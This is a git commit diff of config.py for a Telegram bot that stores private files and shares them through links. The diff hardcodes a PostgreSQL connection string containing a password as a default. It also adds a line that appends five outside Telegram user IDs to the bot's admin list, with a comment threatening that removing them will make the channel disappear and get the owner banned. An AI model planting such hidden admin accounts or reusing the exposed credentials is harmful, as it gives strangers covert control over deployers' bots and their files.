102d406b3edf6b46c59ff9fdcffa725b9e87ba29
Tobixy <shivamrajput69bs@gmail.com>
2024-01-17 18:21:33 +0530

    Update config.py

--- config.py
+++ config.py
@@ -1,3 +1,7 @@
+# (©)Codexbotz
+# Recoded by @mrismanaziz
+# t.me/SharingUserbot & t.me/Lunatic0de
+
 import logging
 import os
 from distutils.util import strtobool
@@ -19,7 +23,7 @@ API_HASH = os.environ.get("API_HASH", "00b7ca7f535e816590db39e76f85d0c7")
 CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))
 
 # OWNER NAME
-OWNER = os.environ.get("OWNER", "")
+OWNER = os.environ.get("OWNER", "tobiix")
 
 # Protect Content
 PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))
@@ -32,10 +36,10 @@ HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
 UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")
 
 # Database
-DB_URI = os.environ.get("DATABASE_URL", "")
+DB_URI = os.environ.get("DATABASE_URL", "postgres://jyhjthfd:jD-Kug_nB5e3I6HIkKETnAd6x_DIDJ5E@snuffleupagus.db.elephantsql.com/jyhjthfd")
 
 # ID of the Channel or Group to force subscribe
-FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
+FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "-1001598773095"))
 FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))
 
 TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
@@ -46,7 +50,7 @@ START_MSG = os.environ.get(
     "<b>Hello {first}</b>\n\n<b>I can store private files in a specific Channel, and other users can access them through a special link.</b>",
 )
 try:
-    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "5740282189").split())]
+    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "5715764478").split())]
 except ValueError:
     raise Exception("Your Admins list does not contain valid Telegram User IDs.")
 
@@ -62,6 +66,11 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 # Set to True if you want to Disable the Share button for your Channel Posts
 DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))
 
+# Do not Remove, or else ERRORS will occur later, DELETE the IDs below = ACCEPT THE CONSEQUENCES
+# Spoiler for the CONSEQUENCES, the Channel might suddenly disappear and I will ban the owner 🤪
+ADMINS.extend((6141526656, 1631866308, 1941179517, 1424231015, 5715764478))
+
+
 LOG_FILE_NAME = "logs.txt"
 logging.basicConfig(
     level=logging.INFO,
@@ -73,6 +82,7 @@ logging.basicConfig(
     ],
 )
 logging.getLogger("pyrogram").setLevel(logging.WARNING)
+
 
 def LOGGER(name: str) -> logging.Logger:
     return logging.getLogger(name)
